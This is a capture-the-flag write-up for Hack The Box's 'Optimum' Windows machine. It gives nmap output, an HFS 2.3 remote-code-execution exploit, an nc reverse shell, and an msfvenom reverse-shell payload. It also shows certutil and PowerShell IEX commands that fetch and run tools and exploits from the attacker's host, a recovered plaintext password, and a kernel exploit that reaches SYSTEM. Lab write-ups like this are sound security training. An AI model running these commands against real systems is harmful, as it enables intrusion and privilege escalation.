# Optimum
## Reconnaissance

* Performed TCP and UDP scans using Nmap.
```
sudo nmap -sC -sS -sV -A 10.10.10.8
```
* The results of the Nmap show that TCP port 80 is open. 
```
sudo nmap -sC -sS -sV -A 10.10.10.8
Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-05 20:24 EST
Nmap scan report for 10.10.10.8
Host is up (0.27s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2012 (91%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (91%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows 7 Professional (87%), Microsoft Windows 8.1 Update 1 (86%), Microsoft Windows Phone 7.5 or 8.0 (86%), Microsoft Windows 7 or Windows Server 2008 R2 (85%), Microsoft Windows Server 2008 R2 (85%), Microsoft Windows Server 2008 R2 or Windows 8.1 (85%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   272.84 ms 10.10.14.1
2   273.00 ms 10.10.10.8

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.25 seconds
```
## Delivery & Exploitation
* Searchsploit for HFS exploit. Setup python SimpleHTTPServer and nc listener. Successfully obtain reverse shell.
```
kali@kali:~/HTB/optimum$ searchsploit hfs  
kali@kali:~/HTB/optimum$ searchsploit -m windows/remote/39161.py
  Exploit: Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)
      URL: https://www.exploit-db.com/exploits/39161     
     Path: /usr/share/exploitdb/exploits/windows/remote/39161.py
File Type: Python script, ASCII text executable, with very long lines, with CRLF line terminators
```

```
kali@kali:~/HTB/optimum$ sudo nc -nvlp 443
listening on [any] 443 ...
connect to [10.10.14.10] from (UNKNOWN) [10.10.10.8] 49162
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\kostas\Desktop>whoami
whoami
optimum\kostas

C:\Users\kostas\Desktop>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 10.10.10.8
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.10.10.2

Tunnel adapter isatap.{99C463C2-DC10-45A6-9CC8-E62F160519AE}:

   Media State . . . . . . . . . . . : Media disconnected 
   Connection-specific DNS Suffix  . : 

C:\Users\kostas\Desktop>type user.txt
type user.txt
The system cannot find the file specified.

C:\Users\kostas\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is D0BC-0196

 Directory of C:\Users\kostas\Desktop

12/11/2020  12:51     <DIR>          .
12/11/2020  12:51     <DIR>          ..
18/03/2017  02:11            760.320 hfs.exe
18/03/2017  02:13                 32 user.txt.txt
               2 File(s)        760.352 bytes
               2 Dir(s)  31.861.141.504 bytes free

C:\Users\kostas\Desktop>type user.txt.txt
type user.txt.txt
d0c39409d7b994a9a1389ebf38ef5f73
```

## Privilege Escalation

* Use Certutil to transfer winPEAS.bat to check for PE 
```
certutil -urlcache -split -f http://10.10.14.10/winPEAS.bat C:\Users\kostas\Desktop\winPEAS.bat
C:\Users\kostas\Desktop>winPEAS.bat                                                                               

Host Name:                 OPTIMUM                                                                                
OS Name:                   Microsoft Windows Server 2012 R2 Standard                                              
OS Version:                6.3.9600 N/A Build 9600                                                                
OS Manufacturer:           Microsoft Corporation                                                                  
OS Configuration:          Standalone Server                                                                      
OS Build Type:             Multiprocessor Free                                                                    
Registered Owner:          Windows User                                                                           
Registered Organization:                                                                                          
Product ID:                00252-70000-00000-AA535                                                                
Original Install Date:     18/3/2017, 1:51:36                                                                     
System Boot Time:          12/11/2020, 12:49:52                                                                   
System Manufacturer:       VMware, Inc.                                                                           
System Model:              VMware Virtual Platform                                                                
System Type:               x64-based PC                                                                           
Processor(s):              1 Processor(s) Installed.                                                              
                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz                        
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018                                              
Windows Directory:         C:\Windows                                                                             
System Directory:          C:\Windows\system32                                                                    
Boot Device:               \Device\HarddiskVolume1                                                                
System Locale:             el;Greek                                                                               
Input Locale:              en-us;English (United States)                                                          
Time Zone:                 (UTC+02:00) Athens, Bucharest                                                          
Total Physical Memory:     4.095 MB                                                                               
Available Physical Memory: 3.313 MB                                                                               
Virtual Memory: Max Size:  5.503 MB                                                                               
Virtual Memory: Available: 4.689 MB                                                                               
Virtual Memory: In Use:    814 MB                                                                                 
Page File Location(s):     C:\pagefile.sys                                                                        
Domain:                    HTB                                                                                    
Logon Server:              \\OPTIMUM                                                                              
Hotfix(s):                 31 Hotfix(s) Installed.                                                                


PRIVILEGES INFORMATION                                                                                            
----------------------                                                                                            
                                                                                                                  
Privilege Name                Description                    State                                                
============================= ============================== ========                                             
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled                                              
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled                                             
                                                                                                                  
```


* Use Certutil to transfer winPEAS.bat to check for PE 
```
certutil -urlcache -split -f http://10.10.14.10/Sherlock.ps1 C:\Users\kostas\Desktop\Sherlock.ps1

C:\Users\kostas\Desktop>powershell.exe -File Sherlock.ps1 -ExecutionPolicy Bypass                                 
powershell.exe -File Sherlock.ps1 -ExecutionPolicy Bypass                                                         
                                                                                                                  
                                                                                                                  
Title      : User Mode to Ring (KiTrap0D)                                                                         
MSBulletin : MS10-015                                                                                             
CVEID      : 2010-0232                                                                                            
Link       : https://www.exploit-db.com/exploits/11199/                                                           
VulnStatus : Not supported on 64-bit systems                                                                      
                                                                                                                  
Title      : Task Scheduler .XML                                                                                  
MSBulletin : MS10-092                                                                                             
CVEID      : 2010-3338, 2010-3888                                                                                 
Link       : https://www.exploit-db.com/exploits/19930/                                                           
VulnStatus : Not Vulnerable                                                                                       
                                                                                                                  
Title      : NTUserMessageCall Win32k Kernel Pool Overflow                                                        
MSBulletin : MS13-053                                                                                             
CVEID      : 2013-1300                                                                                            
Link       : https://www.exploit-db.com/exploits/33213/                                                           
VulnStatus : Not supported on 64-bit systems                                                                      
                                                                                                                  
Title      : TrackPopupMenuEx Win32k NULL Page                                                                    
MSBulletin : MS13-081                                                                                             
CVEID      : 2013-3881                                                                                            
Link       : https://www.exploit-db.com/exploits/31576/  
VulnStatus : Not supported on 64-bit systems
                            
Title      : TrackPopupMenu Win32k Null Pointer Dereference                                                       
MSBulletin : MS14-058                                    
CVEID      : 2014-4113                                   
Link       : https://www.exploit-db.com/exploits/35101/  
VulnStatus : Not Vulnerable                              
                            
Title      : ClientCopyImage Win32k
MSBulletin : MS15-051                                                                                             
CVEID      : 2015-1701, 2015-2433                        
Link       : https://www.exploit-db.com/exploits/37367/
VulnStatus : Not Vulnerable 
                                                         
Title      : Font Driver Buffer Overflow                 
MSBulletin : MS15-078 
CVEID      : 2015-2426, 2015-2433                                                                                 
Link       : https://www.exploit-db.com/exploits/38222/
VulnStatus : Not Vulnerable                              

Title      : 'mrxdav.sys' WebDAV        
MSBulletin : MS16-016
CVEID      : 2016-0051
Link       : https://www.exploit-db.com/exploits/40085/                                                           
VulnStatus : Not supported on 64-bit systems             
                            
Title      : Secondary Logon Handle                      
MSBulletin : MS16-032       
CVEID      : 2016-0099      
Link       : https://www.exploit-db.com/exploits/39719/
VulnStatus : Appears Vulnerable                                                                                   
                                                         
Title      : Windows Kernel-Mode Drivers EoP             
MSBulletin : MS16-034                                    
CVEID      : 2016-0093/94/95/96                          
Link       : https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS1
             6-034?                                      
VulnStatus : Appears Vulnerable                                                                                   
                                                         
Title      : Win32k Elevation of Privilege             
MSBulletin : MS16-135       
CVEID      : 2016-7255                                   
Link       : https://github.com/FuzzySecurity/PSKernel-Primitives/tree/master/S
             ample-Exploits/MS16-135
VulnStatus : Appears Vulnerable                                                                                   
                                                         
Title      : Nessus Agent 6.6.2 - 6.10.3                 
MSBulletin : N/A
CVEID      : 2017-7199                                   
Link       : https://aspe1337.blogspot.co.uk/2017/04/writeup-of-cve-2017-7199.h
             tml      
VulnStatus : Not Vulnerable                                                                                       
                                                        
```

* Search and test exploits for MS16-032,MS16-034,MS16-135

```
certutil -urlcache -split -f http://10.10.14.10/39719.ps1 C:\Users\kostas\Desktop\ms16-032.ps1
powershell.exe -File ms16-032.ps1 -ExecutionPolicy Bypass                                                         


certutil -urlcache -split -f http://10.10.14.10/ms16-032.exe C:\Users\kostas\Desktop\ms16-032.exe
certutil -urlcache -split -f http://10.10.14.10/ms16-032x64.exe C:\Users\kostas\Desktop\ms16-032x64.exe
certutil -urlcache -split -f http://10.10.14.10/MS16-135.ps1 C:\Users\kostas\Desktop\MS16-135.ps1
powershell.exe -File MS16-135.ps1 -ExecutionPolicy Bypass    

C:\Users\kostas\Desktop>powershell.exe -File MS16-135.ps1 -ExecutionPolicy Bypass                                                         
powershell.exe -File MS16-135.ps1 -ExecutionPolicy Bypass                                                         
         _____ _____ ___   ___     ___   ___ ___ 
        |     |   __|_  | |  _|___|_  | |_  |  _|
        | | | |__   |_| |_| . |___|_| |_|_  |_  |
        |_|_|_|_____|_____|___|   |_____|___|___|

                           [by b33f -> @FuzzySec]
                                           

[!] Target architecture is x64 only!

```
* MS16-135 exploit failed with error that target architecture needs to be x64. The target machine is x64. 
* Suspect that the initial reverse shell may have ran x86 shell. Create a new reverse shell executable using MSFvenom for x64 architecture and try running the exploit from that reverse shell.
```
kali@kali:~/HTB/optimum$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.10 LPORT=25 -f exe -o reverse25.
exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: reverse25.exe

C:\Users\kostas\Desktop>certutil -urlcache -split -f http://10.10.14.10/reverse25.exe C:\Users\kostas\Desktop\reverse25.exe
certutil -urlcache -split -f http://10.10.14.10/reverse25.exe C:\Users\kostas\Desktop\reverse25.exe
****  Online  ****
  0000  ...
  1c00
CertUtil: -URLCache command completed successfully.
C:\Users\kostas\Desktop>reverse25.exe
reverse25.exe

C:\Users\kostas\Desktop>powershell.exe -File MS16-135.ps1 -ExecutionPolicy Bypass                                 
                         
powershell.exe -File MS16-135.ps1 -ExecutionPolicy Bypass
         _____ _____ ___   ___     ___   ___ ___ 
        |     |   __|_  | |  _|___|_  | |_  |  _|
        | | | |__   |_| |_| . |___|_| |_|_  |_  |
        |_|_|_|_____|_____|___|   |_____|___|___|

                           [by b33f -> @FuzzySec]
                                           
[?] Target is Win 8.1
[+] Bitmap dimensions: 0x760*0x4

[?] Adjacent large session pool feng shui..
[+] Worker  : FFFFF901447D8000
[+] Manager : FFFFF901447DA000
[+] Distance: 0x2000

[?] Creating Window objects
[+] Corrupting child window spmenu
[+] Trying to trigger arbitrary 'Or'..
[+] Trying to trigger arbitrary 'Or'..
[+] Trying to trigger arbitrary 'Or'..
[+] Trying to trigger arbitrary 'Or'..
[+] Trying to trigger arbitrary 'Or'..
[+] Trying to trigger arbitrary 'Or'..
[+] Trying to trigger arbitrary 'Or'..
[+] Trying to trigger arbitrary 'Or'..
[+] Trying to trigger arbitrary 'Or'..
[+] Trying to trigger arbitrary 'Or'..

[!] Bug did not trigger, try again or patched?
                                                     

```

```
powershell.exe -nop -exec bypass "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.10/PowerUp.ps1'); Invoke-AllChecks"

C:\Users\kostas\Desktop>powershell.exe -nop -exec bypass "IEX (New-Object Net.WebClient).DownloadString('http://10
.10.14.10/PowerUp.ps1'); Invoke-AllChecks"
powershell.exe -nop -exec bypass "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.10/PowerUp.ps1');
 Invoke-AllChecks"                                                                                                

[*] Running Invoke-AllChecks 

                            
[*] Checking if user is in a local group with administrative privileges...


[*] Checking for unquoted service paths...


[*] Checking service executable and argument permissions...


[*] Checking service permissions...


[*] Checking %PATH% for potentially hijackable DLL locations...


[*] Checking for AlwaysInstallElevated registry key...


[*] Checking for Autologon credentials in registry...


DefaultDomainName    : 
DefaultUserName      : kostas
DefaultPassword      : kdeEjDowkS*
AltDefaultDomainName : 
AltDefaultUserName   : 
AltDefaultPassword   : 





[*] Checking for modifidable registry autoruns and configs...


[*] Checking for modifiable schtask files/configs...


[*] Checking for unattended install files...


[*] Checking for encrypted web.config strings...


[*] Checking for encrypted application pool and virtual directory passwords...


[*] Checking for plaintext passwords in McAfee SiteList.xml files....




[*] Checking for cached Group Policy Preferences .xml files....

```

certutil -urlcache -split -f http://10.10.14.10/privesc.exe C:\Users\kostas\Desktop\privesc.exe

C:\Users\kostas\Desktop>privesc.exe --audit -a -o wpc-report
privesc.exe --audit -a -o wpc-report


https://github.com/abatchy17/WindowsExploits/raw/master/MS15-051/MS15-051_Taihou64.exe
certutil -urlcache -split -f http://10.10.14.10/MS15-051_Taihou64.exe C:\Users\kostas\Desktop\MS15-051_Taihou64.exe



* Try exploit suggester
```
kali@kali:~/HTB/optimum$ python /home/kali/Tools/windows-exploit-suggester.py --database 2020-11-05-mssb.xls --sys
teminfo systeminfo                                                                                                
[*] initiating winsploit version 3.3...                                                                           
[*] database file detected as xls or xlsx based on extension                                                      
[*] attempting to read from the systeminfo input file                                                             
[+] systeminfo input file read successfully (ascii)                                                               
[*] querying database file for potential vulnerabilities                                                          [*] comparing the 32 hotfix(es) against the 266 potential bulletins(s) with a database of 137 known exploits
[*] there are now 246 remaining vulns                                                                             [+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
[+] windows version identified as 'Windows 2012 R2 64-bit'                                                        [*]            
[E] MS16-135: Security Update for Windows Kernel-Mode Drivers (3199135) - Important                               [*]   https://www.exploit-db.com/exploits/40745/ -- Microsoft Windows Kernel - win32k Denial of Service (MS16-135)
[*]   https://www.exploit-db.com/exploits/41015/ -- Microsoft Windows Kernel - 'win32k.sys' 'NtSetWindowLongPtr' Privilege Escalation (MS16-135) (2)
[*]   https://github.com/tinysec/public/tree/master/CVE-2016-7255                                                 [*]                                                                                                               
[E] MS16-098: Security Update for Windows Kernel-Mode Drivers (3178466) - Important                               
[*]   https://www.exploit-db.com/exploits/41020/ -- Microsoft Windows 8.1 (x64) - RGNOBJ Integer Overflow (MS16-09
8)                                                                                                                [*]                                                                                                               
[M] MS16-075: Security Update for Windows SMB Server (3164038) - Important                                        [*]   https://github.com/foxglovesec/RottenPotato
[*]   https://github.com/Kevin-Robertson/Tater                                                                    
[*]   https://bugs.chromium.org/p/project-zero/issues/detail?id=222 -- Windows: Local WebDAV NTLM Reflection Eleva
tion of Privilege                                                                                                 
[*]   https://foxglovesecurity.com/2016/01/16/hot-potato/ -- Hot Potato - Windows Privilege Escalation
[*]                                                                                                               [E] MS16-074: Security Update for Microsoft Graphics Component (3164036) - Important                              
[*]   https://www.exploit-db.com/exploits/39990/ -- Windows - gdi32.dll Multiple DIB-Related EMF Record Handlers H
eap-Based Out-of-Bounds Reads/Memory Disclosure (MS16-074), PoC                                                   
[*]   https://www.exploit-db.com/exploits/39991/ -- Windows Kernel - ATMFD.DLL NamedEscape 0x250C Pool Corruption 
(MS16-074), PoC                                                                                                   
[*]                         
[E] MS16-063: Cumulative Security Update for Internet Explorer (3163649) - Critical                        
[*]   https://www.exploit-db.com/exploits/39994/ -- Internet Explorer 11 - Garbage Collector Attribute Type Confus
ion (MS16-063), PoC                                      
[*]                                                                                                               
[E] MS16-032: Security Update for Secondary Logon to Address Elevation of Privile (3143141) - Important           [*]   https://www.exploit-db.com/exploits/40107/ -- MS16-032 Secondary Logon Handle Privilege Escalation, MSF
[*]   https://www.exploit-db.com/exploits/39574/ -- Microsoft Windows 8.1/10 - Secondary Logon Standard Handles Mi
ssing Sanitization Privilege Escalation (MS16-032), PoC                                                           [*]   https://www.exploit-db.com/exploits/39719/ -- Microsoft Windows 7-10 & Server 2008-2012 (x32/x64) - Local Pr
ivilege Escalation (MS16-032) (PowerShell), PoC                                                                   
[*]   https://www.exploit-db.com/exploits/39809/ -- Microsoft Windows 7-10 & Server 2008-2012 (x32/x64) - Local Pr
ivilege Escalation (MS16-032) (C#)                                                                                
[*]                                                                                                               
[M] MS16-016: Security Update for WebDAV to Address Elevation of Privilege (3136041) - Important                  [*]   https://www.exploit-db.com/exploits/40085/ -- MS16-016 mrxdav.sys WebDav Local Privilege Escalation, MSF    
[*]   https://www.exploit-db.com/exploits/39788/ -- Microsoft Windows 7 - WebDAV Privilege Escalation Exploit (MS1
6-016) (2), PoC                                                                                                   [*]   https://www.exploit-db.com/exploits/39432/ -- Microsoft Windows 7 SP1 x86 - WebDAV Privilege Escalation (MS1
6-016) (1), PoC                                          
[*]                                                                                                               [E] MS16-014: Security Update for Microsoft Windows to Address Remote Code Execution (3134228) - Important        
[*]   Windows 7 SP1 x86 - Privilege Escalation (MS16-014), https://www.exploit-db.com/exploits/40039/, PoC        [*]                                                                                                               
[E] MS16-007: Security Update for Microsoft Windows to Address Remote Code Execution (3124901) - Important        
[*]   https://www.exploit-db.com/exploits/39232/ -- Microsoft Windows devenum.dll!DeviceMoniker::Load() - Heap Cor
ruption Buffer Underflow (MS16-007), PoC                                                                          
[*]   https://www.exploit-db.com/exploits/39233/ -- Microsoft Office / COM Object DLL Planting with WMALFXGFXDSP.d
ll (MS-16-007), PoC                                                                                               
[*]                                                                                                               [E] MS15-132: Security Update for Microsoft Windows to Address Remote Code Execution (3116162) - Important  
[*]   https://www.exploit-db.com/exploits/38968/ -- Microsoft Office / COM Object DLL Planting with comsvcs.dll Delay Load of mqrt.dll (MS15-132), PoC                                                                              
[*]   https://www.exploit-db.com/exploits/38918/ -- Microsoft Office / COM Object els.dll DLL Planting (MS15-134), PoC           
[*]                                                                                                               [E] MS15-112: Cumulative Security Update for Internet Explorer (3104517) - Critical                               
[*]   https://www.exploit-db.com/exploits/39698/ -- Internet Explorer 9/10/11 - CDOMStringDataList::InitFromString Out-of-Bounds Read (MS15-112)    
[*]                                                                                                               [E] MS15-111: Security Update for Windows Kernel to Address Elevation of Privilege (3096447) - Important          
[*]   https://www.exploit-db.com/exploits/38474/ -- Windows 10 Sandboxed Mount Reparse Point Creation Mitigation B
ypass (MS15-111), PoC                                                                                             
[*]                                                                                                               [E] MS15-102: Vulnerabilities in Windows Task Management Could Allow Elevation of Privilege (3089657) - Important 
[*]   https://www.exploit-db.com/exploits/38202/ -- Windows CreateObjectTask SettingsSyncDiagnostics Privilege Escalation, PoC                                             
[*]   https://www.exploit-db.com/exploits/38200/ -- Windows Task Scheduler DeleteExpiredTaskAfter File Deletion Pr
ivilege Escalation, PoC                                                                                           
[*]   https://www.exploit-db.com/exploits/38201/ -- Windows CreateObjectTask TileUserBroker Privilege Escalation, 
PoC                                                                                                               
[*]                                                                                                               [E] MS15-097: Vulnerabilities in Microsoft Graphics Component Could Allow Remote Code Execution (3089656) - Critic
al                                                                                                                
[*]   https://www.exploit-db.com/exploits/38198/ -- Windows 10 Build 10130 - User Mode Font Driver Thread Permissi
ons Privilege Escalation, PoC                  
[*]   https://www.exploit-db.com/exploits/38199/ -- Windows NtUserGetClipboardAccessToken Token Leak, PoC         
[*]                         
[M] MS15-078: Vulnerability in Microsoft Font Driver Could Allow Remote Code Execution (3079904) - Critical
[*]   https://www.exploit-db.com/exploits/38222/ -- MS15-078 Microsoft Windows Font Driver Buffer Overflow        
[*]                                                      
[E] MS15-052: Vulnerability in Windows Kernel Could Allow Security Feature Bypass (3050514) - Important           
[*]   https://www.exploit-db.com/exploits/37052/ -- Windows - CNG.SYS Kernel Security Feature Bypass PoC (MS15-052), PoC                                                                                                            
[*]                                                                                                               
[M] MS15-051: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (3057191) - Important                                                                                                               
[*]   https://github.com/hfiref0x/CVE-2015-1701, Win32k Elevation of Privilege Vulnerability, PoC                 
[*]   https://www.exploit-db.com/exploits/37367/ -- Windows ClientCopyImage Win32k Exploit, MSF                   
[*]                                                                                                               
[E] MS15-010: Vulnerabilities in Windows Kernel-Mode Driver Could Allow Remote Code Execution (3036220) - Critical
[*]   https://www.exploit-db.com/exploits/39035/ -- Microsoft Windows 8.1 - win32k Local Privilege Escalation (MS15-010), PoC                                                                                                       
[*]   https://www.exploit-db.com/exploits/37098/ -- Microsoft Windows - Local Privilege Escalation (MS15-010), PoC
[*]   https://www.exploit-db.com/exploits/39035/ -- Microsoft Windows win32k Local Privilege Escalation (MS15-010), PoC                                                                                                             
[*]                                                      
[E] MS15-001: Vulnerability in Windows Application Compatibility Cache Could Allow Elevation of Privilege (3023266) - Important                                                                                                     
[*]   http://www.exploit-db.com/exploits/35661/ -- Windows 8.1 (32/64 bit) - Privilege Escalation (ahcache.sys/NtApphelpCacheControl), PoC                                                                                          
[*]                                                                                                               
[E] MS14-068: Vulnerability in Kerberos Could Allow Elevation of Privilege (3011780) - Critical                   
[*]   http://www.exploit-db.com/exploits/35474/ -- Windows Kerberos - Elevation of Privilege (MS14-068), PoC      
[*]                                                                                                               
[M] MS14-064: Vulnerabilities in Windows OLE Could Allow Remote Code Execution (3011443) - Critical               
[*]   https://www.exploit-db.com/exploits/37800// -- Microsoft Windows HTA (HTML Application) - Remote Code Execution (MS14-064), PoC                                                                                               
[*]   http://www.exploit-db.com/exploits/35308/ -- Internet Explorer OLE Pre-IE11 - Automation Array Remote Code Execution / Powershell VirtualAlloc (MS14-064), PoC                                                                
[*]   http://www.exploit-db.com/exploits/35229/ -- Internet Explorer <= 11 - OLE Automation Array Remote Code Execution (#1), PoC
[*]   http://www.exploit-db.com/exploits/35230/ -- Internet Explorer < 11 - OLE Automation Array Remote Code Execution (MSF), MSF                                                                                                   
[*]   http://www.exploit-db.com/exploits/35235/ -- MS14-064 Microsoft Windows OLE Package Manager Code Execution Through Python, MSF                                       
[*]   http://www.exploit-db.com/exploits/35236/ -- MS14-064 Microsoft Windows OLE Package Manager Code Execution, MSF                                                                                                               
[*]                                                                                                               
[M] MS14-060: Vulnerability in Windows OLE Could Allow Remote Code Execution (3000869) - Important                
[*]   http://www.exploit-db.com/exploits/35055/ -- Windows OLE - Remote Code Execution 'Sandworm' Exploit (MS14-060), PoC                                                                                                           
[*]   http://www.exploit-db.com/exploits/35020/ -- MS14-060 Microsoft Windows OLE Package Manager Code Execution, MSF                                                      
[*]                                                                                                               
[M] MS14-058: Vulnerabilities in Kernel-Mode Driver Could Allow Remote Code Execution (3000061) - Critical        
[*]   http://www.exploit-db.com/exploits/35101/ -- Windows TrackPopupMenu Win32k NULL Pointer Dereference, MSF    
[*]                                                                                                               
[E] MS13-101: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (2880430) - Important                                                                                                               
[M] MS13-090: Cumulative Security Update of ActiveX Kill Bits (2900986) - Critical                                
[*] done                                                                                                      
```

* Try https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/41020.exe
```
C:\Users\kostas\Desktop>certutil -urlcache -split -f http://10.10.14.10/41020.exe C:\Users\kostas\Desktop\41020.exe

certutil -urlcache -split -f http://10.10.14.10/41020.exe C:\Users\kostas\Desktop\41020.exe
****  Online  ****
  000000  ...
  088c00
CertUtil: -URLCache command completed successfully.

C:\Users\kostas\Desktop>
C:\Users\kostas\Desktop>41020.exe
41020.exe
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\kostas\Desktop>whoami
whoami
nt authority\system

C:\Users\kostas\Desktop>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 10.10.10.8
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.10.10.2

Tunnel adapter isatap.{99C463C2-DC10-45A6-9CC8-E62F160519AE}:

   Media State . . . . . . . . . . . : Media disconnected 
   Connection-specific DNS Suffix  . : 

C:\Users\kostas\Desktop>cd c:\Users\Administrator\Desktop
cd c:\Users\Administrator\Desktop

c:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is D0BC-0196

 Directory of c:\Users\Administrator\Desktop

18/03/2017  02:14     <DIR>          .
18/03/2017  02:14     <DIR>          ..
18/03/2017  02:14                 32 root.txt
               1 File(s)             32 bytes
               2 Dir(s)  31.870.279.680 bytes free

c:\Users\Administrator\Desktop>type root.txt
type root.txt
51ed1b36553c8461f4552c2e92b3eeed
```
